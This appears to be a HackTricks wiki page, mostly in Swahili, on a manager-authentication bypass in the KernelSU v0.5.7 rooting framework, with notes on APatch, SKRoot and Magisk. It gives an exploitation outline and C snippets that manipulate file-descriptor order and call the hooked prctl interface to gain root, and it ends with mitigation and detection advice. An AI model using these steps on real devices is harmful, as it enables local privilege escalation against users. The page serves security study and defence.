# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks kama KernelSU, APatch, SKRoot na Magisk mara nyingi hupatch Linux/Android kernel na kufichua utendaji wenye privileged kwa userspace isiyo na privileged ya "manager" app kupitia syscall iliyohookiwa. Ikiwa hatua ya manager-authentication ina dosari, app yoyote ya local inaweza kufikia channel hii na kuongeza privileges kwenye devices ambazo tayari zimerootiwa.

Ukurasa huu unaeleza kwa ujumla techniques na pitfalls zilizogunduliwa katika public research (hasa uchambuzi wa Zimperium wa KernelSU v0.5.7) ili kusaidia red na blue teams kuelewa attack surfaces, exploitation primitives, na robust mitigations.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch inahook syscall (mara nyingi prctl) ili kupokea "commands" kutoka userspace.
- Protocol kwa kawaida ni: magic_value, command_id, arg_ptr/len ...
- Userspace manager app hufanya authentication kwanza (kwa mfano, CMD_BECOME_MANAGER). Kernel ikishaweka alama kwamba caller ni trusted manager, privileged commands zinakubaliwa:
- Grant root kwa caller (kwa mfano, CMD_GRANT_ROOT)
- Kusimamia allowlists/deny-lists za su
- Kurekebisha SELinux policy (kwa mfano, CMD_SET_SEPOLICY)
- Kuuliza version/configuration
- Kwa kuwa app yoyote inaweza kuinvoke syscalls, usahihi wa manager authentication ni muhimu sana.

Example (KernelSU design):
- Hooked syscall: prctl
- Magic value ya kupeleka request kwa KernelSU handler: 0xDEADBEEF
- Commands zinajumuisha: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## KernelSU v0.5.7 authentication flow (kama ilivyotekelezwa)

Userspace inapomuita prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU inathibitisha:

1) Path prefix check
- Path iliyotolewa lazima ianze na prefix inayotarajiwa kwa caller UID, kwa mfano /data/data/<pkg> au /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Path lazima iwe owned na caller UID.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check kupitia FD table scan
- Iteration hufanyika kwenye file descriptors (FDs) zilizo wazi za calling process.
- Huchaguliwa file ya kwanza ambayo path yake inalingana na /data/app/*/base.apk.
- APK v2 signature huchanganuliwa na kuthibitishwa dhidi ya official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Ikiwa checks zote zitapita, kernel huhifadhi kwa muda UID ya manager na hukubali privileged commands kutoka kwa UID hiyo hadi ifanyiwe reset.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

Ikiwa signature check inahusisha "the first matching /data/app/*/base.apk" inayopatikana kwenye process FD table, basi haihakikishi package ya caller yenyewe. Attacker anaweza kuweka mapema APK iliyosainiwa kihalali (manager halisi) ili ionekane mapema kwenye FD list kuliko base.apk yao wenyewe.

Trust-by-indirection hii humwezesha unprivileged app kuiga manager bila kumiliki manager’s signing key.<sup>[[1]](#references)</sup>

Key properties zilizotumiwa:<sup>[[1]](#references)</sup>
- FD scan haihusishi package identity ya caller; inalinganisha tu path strings kwa pattern.
- open() hurudisha FD iliyo chini zaidi inayopatikana. Kwa kufunga FDs zenye nambari ndogo kwanza, attacker anaweza kudhibiti ordering.
- Filter hukagua tu kwamba path inalingana na /data/app/*/base.apk – haihakikishi kwamba inahusiana na installed package ya caller.

---
## Attack preconditions

- Device tayari imerootiwa kwa vulnerable rooting framework (kwa mfano, KernelSU v0.5.7).
- Attacker anaweza kuendesha arbitrary unprivileged code locally (Android app process).
- Manager halisi bado haijaauthenticate (kwa mfano, mara tu baada ya reboot). Baadhi ya frameworks huhifadhi manager UID baada ya success; lazima ushinde race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:<sup>[[1]](#references)[[9]](#references)</sup>
1) Tengeneza valid path kwenda kwenye directory ya data ya app yako ili kutimiza prefix na ownership checks.
2) Hakikisha genuine KernelSU Manager base.apk imefunguliwa kwenye FD yenye nambari ndogo kuliko base.apk yako.
3) Invoke prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) ili kupitisha checks.
4) Toa privileged commands kama CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY ili elevation ibaki.

Practical notes kuhusu step 2 (FD ordering):<sup>[[1]](#references)</sup>
- Tambua FD ya process yako inayohusiana na /data/app/*/base.apk yako mwenyewe kwa kutembea kwenye /proc/self/fd symlinks.
- Funga FD yenye nambari ndogo (kwa mfano, stdin, fd 0) na ufungue legitimate manager APK kwanza ili ichukue fd 0 (au index yoyote iliyo chini ya base.apk fd yako).
- Bundle legitimate manager APK pamoja na app yako ili path yake itimize naive filter ya kernel. Kwa mfano, iweke chini ya subpath inayolingana na /data/app/*/base.apk.

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Lazimisha FD yenye nambari ndogo kuelekeza kwenye manager APK halali:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Uthibitishaji wa meneja kupitia prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Baada ya kufanikiwa, privileged commands (mifano):
- CMD_GRANT_ROOT: pandisha mchakato wa sasa uwe root
- CMD_ALLOW_SU: ongeza package/UID yako kwenye allowlist kwa persistent su
- CMD_SET_SEPOLICY: rekebisha SELinux policy kama inavyoungwa mkono na framework

Ushauri wa race/persistence:
- Sajili receiver ya BOOT_COMPLETED katika AndroidManifest (RECEIVE_BOOT_COMPLETED) ili kuanza mapema baada ya reboot na kujaribu authentication kabla ya manager halali.<sup>[[1]](#references)</sup>

---
## Mwongozo wa detection na mitigation

Kwa watengenezaji wa framework:
- Funga authentication kwenye package/UID ya caller, si kwenye FDs zisizo maalum:
- Tambua package ya caller kutoka kwenye UID yake na uithibitishe dhidi ya signature ya package iliyosakinishwa (kupitia PackageManager) badala ya kuchanganua FDs.
- Ikiwa ni kernel-only, tumia utambulisho thabiti wa caller (task creds) na uuthibitishe dhidi ya chanzo thabiti cha ukweli kinachosimamiwa na init/userspace helper, si process FDs.
- Epuka ukaguzi wa path-prefix kama utambulisho; caller anaweza kuutimiza kwa urahisi sana.
- Tumia nonce-based challenge–response kupitia channel na ufute manager identity yoyote iliyohifadhiwa kwenye cache wakati wa boot au kwenye matukio muhimu.
- Zingatia binder-based authenticated IPC badala ya kutumia generic syscalls kupita kiasi inapowezekana.

Kwa defenders/blue team:
- Tambua kuwepo kwa rooting frameworks na manager processes; fuatilia prctl calls zilizo na magic constants zinazotiliwa shaka (k.m. 0xDEADBEEF) ikiwa una kernel telemetry.
- Kwenye managed fleets, zuia au toa alert kuhusu boot receivers kutoka packages zisizoaminika zinazojaribu kwa kasi privileged manager commands baada ya boot.
- Hakikisha devices zimesasishwa hadi patched framework versions; invalidisha cached manager IDs baada ya update.

Vikwazo vya attack:
- Huathiri tu devices ambazo tayari zime-rootiwa kwa framework iliyo vulnerable.
- Kwa kawaida huhitaji reboot/race window kabla ya manager halali kufanya authentication (baadhi ya frameworks huhifadhi manager UID kwenye cache hadi ifanyiwe reset).

---
## Maelezo yanayohusiana katika frameworks mbalimbali

- Password-based auth (k.m. historical APatch/SKRoot builds) inaweza kuwa dhaifu ikiwa passwords zinaweza kukisiwa/bruteforce au validations zina bugs.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (k.m. KernelSU) ina nguvu zaidi kimsingi, lakini lazima ifungwe kwenye caller halisi, si artefacts zisizo za moja kwa moja kama FD scans.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP) ilionyesha kwamba hata ecosystems zilizokomaa zinaweza kuathiriwa na identity spoofing inayosababisha code execution yenye root ndani ya manager context.<sup>[[1]](#references)[[8]](#references)</sup>

---
## References

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
